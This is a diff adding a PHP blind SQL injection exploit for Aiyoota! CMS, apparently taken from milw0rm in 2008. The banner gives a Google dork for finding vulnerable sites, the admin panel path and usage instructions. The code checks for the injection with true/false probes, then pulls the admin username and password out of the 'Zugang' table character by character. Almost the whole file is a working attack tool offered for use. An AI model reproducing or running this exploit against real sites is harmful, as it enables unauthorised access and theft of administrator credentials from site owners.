@@ -1,0 +1,116 @@
+<?php
+    ini_set("max_execution_time",0);
+    ini_set('user_agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9');
+    print_r('
+###############################################################
+#
+#           Aiyoota! CMS - Blind SQL Injection Exploit      
+#                                                              
+#      Vulnerability discovered by: Lidloses_Auge              
+#      Exploit coded by:            Lidloses_Auge
+#      Greetz to:                   -=Player=- , Suicide, g4ms3, enco,
+#                                   Palme, GPM, Free-Hack
+#      Date:                        16.12.2008
+#
+###############################################################
+#                                                              
+#      Dork: inurl:naviid + inurl:liste9
+#      Admin Panel: [Target]/cms/
+#      Usage (Method 1 auto):  php '.$argv[0].' -1 [Target]
+#      Usage (Method 2 manually):  php '.$argv[0].' -2 [Target] [Language] [valid naviID] [ueber] [aiyootaID] [file]
+#      Example (Method 1) for http://www.site.com
+#      => php '.$argv[0].' -1 http://www.site.com
+#      Example (Method 2) for http://www.site.com/english/8/8/45001/liste9.html
+#      => php '.$argv[0].' -2 http://www.site.com english 8 8 45001 liste9.html
+#                                                              
+###############################################################
+');
+    $automatic = $argv[1];
+    $url = $argv[2];
+    if (($argv[1] == "-1" | $argv[1] == "-2") & ($argc == 3 | $argc == 8)) {
+        if ($argv[1] == "-1") {
+            $source = file_get_contents($url."/index.html");
+            $buffer = $source;
+            if (strpos($source,"a href='$url/") != 0) {
+                $place = strpos($source,"a href='$url/");
+                $sprache = substr($source,$place+8+strlen($url)+1,strpos(substr($source,$place+8+strlen($url)+1),"/"));
+                $urlpart = substr($source,$place+8,strpos(substr($source,$place+8),"'"));
+            } else {
+                while (substr($buffer,strpos($buffer,"a href='/")+9,3) == "cms") {
+                    $buffer = substr($buffer,strpos($buffer,"a href='/"));
+                }
+                $place = strpos($buffer, "a href='/");
+                $sprache = substr($buffer,$place+9,strpos(substr($buffer,$place+9),"/"));
+                $urlpart = $url."/".substr($buffer,$place+9,strpos(substr($buffer,$place+9),"'"));
+            }
+            $varstart = strpos($urlpart,$sprache)+strlen($sprache)+1;
+            $injplace = strpos(substr($urlpart,$varstart),"/") + $varstart;
+            $part1 = substr($urlpart,0,$injplace);
+            $part2 = substr($urlpart,$injplace);
+        } elseif ($argv[1] == "-2") {
+            $part1 = $url."/".$argv[3]."/".$argv[4];
+            $part2 = "/".$argv[5]."/".$argv[6]."/".$argv[7];
+        }
+        echo "\nExploiting now!\n\n";
+        $true = file_get_contents($part1."+and+1=1".$part2);
+        $false = file_get_contents($part1."+and+1=0".$part2);
+        $inj = $false;
+        $tbl = array("benutzer","passwort");
+        if (strlen($false) != strlen($true)) {
+            for ($mode = 0; $mode <= 1; $mode++) {
+                echo $tbl[$mode].": ";
+                while ($break == 0) {
+                    $count++;
+                    $injpart1 = file_get_contents($part1."+and+ascii(substring((select+$tbl[$mode]+from+Zugang+limit+0,1),$count,1))>96".$part2);
+                    $injpart2 = file_get_contents($part1."+and+ascii(substring((select+$tbl[$mode]+from+Zugang+limit+0,1),$count,1))>108".$part2);
+                    $injpart3 = file_get_contents($part1."+and+ascii(substring((select+$tbl[$mode]+from+Zugang+limit+0,1),$count,1))<=96".$part2);
+                    $injpart4 = file_get_contents($part1."+and+ascii(substring((select+$tbl[$mode]+from+Zugang+limit+0,1),$count,1))<70".$part2);
+                    $injpart5 = file_get_contents($part1."+and+ascii(substring((select+$tbl[$mode]+from+Zugang+limit+0,1),$count,1))<58".$part2);
+                    if (strlen($false) / strlen($injpart1) * 100 < 98) {
+                        if (strlen($false) / strlen($injpart2) * 100 < 98) {
+                            $border1 = 103;
+                            $border2 = 122;
+                        } else {
+                            $border1 = 96;
+                            $border2 = 108;
+                        }
+                    }
+                    if (strlen($false) / strlen($injpart3) * 100 < 98) {
+                        if (strlen($false) / strlen($injpart4) * 100 < 98) {
+                            if (strlen($false) / strlen($injpart5) * 100 < 98) {
+                                $border1 = 47;
+                                $border2 = 57;
+                            } else {
+                            $border1 = 59;
+                            $border2 = 69;
+                            }
+                        } else {    
+                        $border1 = 70;
+                        $border2 = 96;
+                        }
+                    }        
+                    for ($i = $border1; $i<=$border2; $i++) {
+                        $zero = file_get_contents($part1."+and+ascii(substring((select+$tbl[$mode]+from+Zugang+limit+0,1),$count,1))=0".$part2);
+                        if (strlen($false) / strlen($zero) * 100 < 98) {
+                            $break = 1;
+                            echo "\n";
+                            $i = $border2+1;
+                        } else {
+                            $inj = file_get_contents($part1."+and+ascii(substring((select+$tbl[$mode]+from+Zugang+limit+0,1),$count,1))>$i".$part2);
+                            if ((strlen($inj) / strlen($true) * 100) < 98) {
+                                echo chr($i);
+                                $i = $border2+1;
+                            }
+                        }
+                    }
+                }
+                $break = 0;
+                $count = 0;
+            }
+        }
+    } else {
+        echo "\nOoops, you did a mistake. Correct count of arguments? Correct Method?\n";
+    }
+?>
+
+# milw0rm.com [2008-12-16]
